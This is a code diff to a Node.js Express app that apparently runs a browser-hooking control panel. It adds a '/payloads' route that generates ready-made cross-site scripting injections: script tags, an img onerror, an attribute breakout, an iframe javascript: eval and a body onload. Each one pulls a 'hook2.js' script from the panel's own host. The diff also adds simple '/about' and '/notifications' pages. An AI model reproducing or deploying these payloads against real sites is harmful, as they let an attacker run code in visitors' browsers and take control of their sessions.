@@ -38,5 +38,30 @@ app.get('/panel', (req, res) => {
 });
 
 
+app.get('/payloads', (req, res) => {
+  const host = req.headers.host; // ex: localhost:4000
+  const payloadBase = `<script src="http://${host}/js/hook2.js"></script>`;
+
+  const payloads = [
+    payloadBase,
+    `<img src=x onerror="${payloadBase}">`,
+    `"><script src="http://${host}/js/hook2.js"></script>`,
+    `<iframe src="javascript:eval('<script src=\\'http://${host}/js/hook2.js\\'><\\/script>')">`,
+    `<body onload="${payloadBase}">`
+  ];
+
+  res.render('payloads', { payloads });
+});
+
+app.get('/about', (req, res) => {
+  res.render('about');
+});
+
+app.get('/notifications', (req, res) => {
+  res.render('notifications');
+});
+
+
+
 const PORT = 4000;
 app.listen(PORT, () => console.log(`Listening on http://localhost:${PORT}/panel`));
